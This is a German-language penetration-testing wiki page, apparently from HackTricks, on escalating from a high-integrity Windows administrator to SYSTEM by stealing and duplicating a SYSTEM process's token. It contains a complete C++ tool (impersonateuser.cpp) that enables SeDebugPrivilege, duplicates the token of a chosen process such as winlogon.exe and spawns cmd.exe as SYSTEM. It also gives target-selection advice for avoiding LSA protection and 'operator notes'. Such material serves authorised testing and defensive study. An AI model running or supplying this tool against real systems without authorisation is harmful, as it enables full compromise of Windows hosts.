# SeImpersonate von High zu System

{{#include ../../banners/hacktricks-training.md}}

Auf dieser Seite geht es um die **manuelle** Methode, von einem **High-Integrity-Administratorprozess** zu **`NT AUTHORITY\SYSTEM`** zu gelangen, indem ein **nicht geschützter SYSTEM-Prozess geöffnet, dessen Token dupliziert und ein Child-Prozess mit diesem Token gestartet wird**.

Wenn du nur über **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** verfügst, aber **keinen geeigneten SYSTEM-Prozess öffnen kannst**, ist der **Potato- / Named-Pipe**-Weg normalerweise zuverlässiger:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Wenn du nicht nur `SYSTEM`, sondern ein **SYSTEM-Token mit möglichst vielen Privilegien** möchtest, siehe auch:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Schnelle Triage

Bevor du versuchst, ein Token zu stehlen, überprüfe zunächst kurz den Kontext:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktische Hinweise:

- Ein **High Integrity**-Administratortoken reicht normalerweise aus, um **`SeDebugPrivilege` zu aktivieren** und viele nicht geschützte SYSTEM-Prozesse zu öffnen.
- **`CreateProcessWithTokenW` erfordert `SeImpersonatePrivilege`** beim Aufrufer. Wenn diese API mit `1314` fehlschlägt, wechsle zu `CreateProcessAsUserW`, nachdem du bereits ein primäres SYSTEM-Token dupliziert hast.
- Unter modernen Windows-Versionen ist **`lsass.exe` häufig kein gutes Ziel**, da der **LSA-Schutz / PPL** den Zugriff selbst für Administratoren mit `SeDebugPrivilege` blockiert. Bevorzuge **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** oder einen frühen als SYSTEM laufenden **`svchost.exe`**.
- Nicht jeder SYSTEM-Prozess besitzt ein gleichermaßen nützliches Token. Wenn du SYSTEM erhältst, aber fehlende Privilegien feststellst, versuche es mit einem anderen SYSTEM-Prozess, anstatt anzunehmen, dass die Technik nicht funktioniert.

## PID sorgfältig auswählen

Der einfachste Weg, dies zuverlässig zum Funktionieren zu bringen, besteht darin, einen SYSTEM-Prozess auszuwählen, dessen DACL Administratoren tatsächlich erlaubt, den Prozess abzufragen und sein Token zu duplizieren.

Gute Kandidaten, die du zuerst testen solltest:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- einige frühe `svchost.exe`-Instanzen, die als SYSTEM laufen

Standardmäßig vermeiden:

- `lsass.exe` auf Hosts, auf denen **RunAsPPL / LSA-Schutz** aktiviert ist
- geschützte / sicherheitskritische Prozesse, die selbst nach der Aktivierung von `SeDebugPrivilege` `Access denied` zurückgeben

Du kannst Kandidatenprozesse sowie deren Token/ACLs mit **Process Explorer** oder **Process Hacker** untersuchen, die mit erhöhten Rechten ausgeführt werden.

### Code

Der folgende Code stammt von [hier](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Er ermöglicht es, eine **Process ID als Argument anzugeben**, woraufhin eine CMD **unter dem Benutzer des angegebenen Prozesses** gestartet wird.<sup>[[3]](#references)</sup>\
Wenn du ihn in einem **High Integrity**-Prozess ausführst, kannst du die PID eines als System laufenden Prozesses (z. B. `winlogon`, `wininit`) **angeben** und eine `cmd.exe` als SYSTEM ausführen.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Nützliche Hinweise zu API- und Zugriffsrechten

Das Beispiel verwendet `MAXIMUM_ALLOWED`, aber für reale Vorgänge sollten die erforderlichen Mindestbestandteile beachtet werden:

- `OpenProcessToken()` erfordert lediglich, dass das **process handle** mit **`PROCESS_QUERY_LIMITED_INFORMATION`** geöffnet wurde.
- Für die Verwendung von `CreateProcessWithTokenW()` muss das **primary token handle** über **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** verfügen.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` muss ein **primary token** (`TokenPrimary`) erstellen, nicht nur ein impersonation token.
- Wenn Sie bereits als SYSTEM impersoniert sind und `CreateProcessWithTokenW()` weiterhin mit `1314` fehlschlägt, versuchen Sie stattdessen `CreateProcessAsUserW()`.

Das bedeutet, dass das Öffnen des Zielprozesses mit `PROCESS_ALL_ACCESS` normalerweise unnötig und auffälliger ist, als einfach nur die zum Abfragen des Tokens erforderlichen Rechte anzufordern.

## Fehler

Gelegentlich kann der Versuch, SYSTEM zu impersonieren, fehlschlagen und eine Ausgabe wie die folgende anzeigen:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Das bedeutet, dass Sie selbst bei einer Ausführung auf einem **High Integrity level** **nicht über ausreichende Berechtigungen** für den Zielprozess bzw. das Zieltoken verfügen.\
Überprüfen wir die aktuellen Administratorberechtigungen für `svchost.exe`-Prozesse mit **Process Explorer** (alternativ können Sie auch **Process Hacker** verwenden):

1. Wählen Sie einen `svchost.exe`-Prozess aus
2. Rechtsklick --> Eigenschaften
3. Klicken Sie im Tab „Sicherheit“ unten rechts auf die Schaltfläche „Berechtigungen“
4. Klicken Sie auf „Erweitert“
5. Wählen Sie „Administratoren“ aus und klicken Sie auf „Bearbeiten“
6. Klicken Sie auf „Erweiterte Berechtigungen anzeigen“

![Code - Error: 6. Klicken Sie auf „Erweiterte Berechtigungen anzeigen“](<../../images/image (437).png>)

Das vorherige Bild enthält alle Berechtigungen, die „Administratoren“ für den ausgewählten Prozess besitzen (wie Sie sehen können, verfügen sie bei `svchost.exe` nur über „Abfrage“-Berechtigungen).

Sehen Sie sich die Berechtigungen an, die „Administratoren“ für `winlogon.exe` besitzen:

![Code - Error: Sehen Sie sich die Berechtigungen an, die „Administratoren“ für winlogon.exe besitzen](<../../images/image (1102).png>)

In diesem Prozess können „Administratoren“ den „Speicher lesen“ und „Berechtigungen lesen“, wodurch Administratoren vermutlich das von diesem Prozess verwendete Token impersonieren können.

### Häufige Fehlerursachen

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: Die Prozess-DACL blockiert Sie, oder das Ziel ist **protected/PPL**. Wählen Sie einen anderen SYSTEM-Prozess.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: Ihr Token-Handle wurde ohne ausreichende Rechte geöffnet, oder die DACL des Zieltokens verhindert die Duplizierung.
- **`CreateProcessWithTokenW()` -> `1314`**: Der aufrufende Prozess verfügt derzeit nicht über aktivierte **`SeImpersonatePrivilege`**. Versuchen Sie zunächst, es zu aktivieren, oder verwenden Sie `CreateProcessAsUserW()` mit dem duplizierten primären Token.
- **`CreateProcessWithTokenW()` -> `1326`** nach vorherigen Fehlern: Dies bedeutet häufig lediglich, dass der vorherige Schritt zur Token-Duplizierung bzw. -Impersonation fehlgeschlagen ist und daher kein verwendbares primäres Token zum Starten des untergeordneten Prozesses vorhanden ist.

## Hinweise für Operatoren

- Diese Technik eignet sich hervorragend, wenn Sie bereits **local admin + high integrity** besitzen und einfach einen schnellen, manuellen Weg zu SYSTEM benötigen, ohne einen Service oder eine Named-Pipe-Coercion-Kette einzurichten.
- In gehärteten Windows-11-/Server-Umgebungen ist **LSA protection zunehmend verbreitet**. Daher ist ein Workflow, der davon ausgeht, dass `lsass.exe` immer lesbar ist, fehleranfällig. **`winlogon.exe` / `wininit.exe` / `services.exe` sind normalerweise die bessere erste Auswahl**.<sup>[[2]](#references)</sup>
- Wenn Sie in einem Kontext eines **Servicekontos** statt auf einem erhöhten Admin-Desktop landen, eignet sich die **Potato family** normalerweise besser als diese Seite.



## Referenzen

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
